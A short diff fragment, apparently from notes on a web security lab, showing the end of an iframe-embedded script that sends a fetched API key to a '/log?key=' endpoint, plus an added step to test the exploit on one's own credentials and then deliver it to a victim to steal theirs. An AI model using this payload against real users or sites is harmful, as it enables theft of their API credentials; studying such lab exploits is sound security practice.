@@ -83,7 +83,7 @@ location='/log?key='+this.responseText;
 </script>"></iframe>
 ```
 
-- 
+- store and view, check your api creds get logged, then deliver to victim to steal theirs
 
 
 
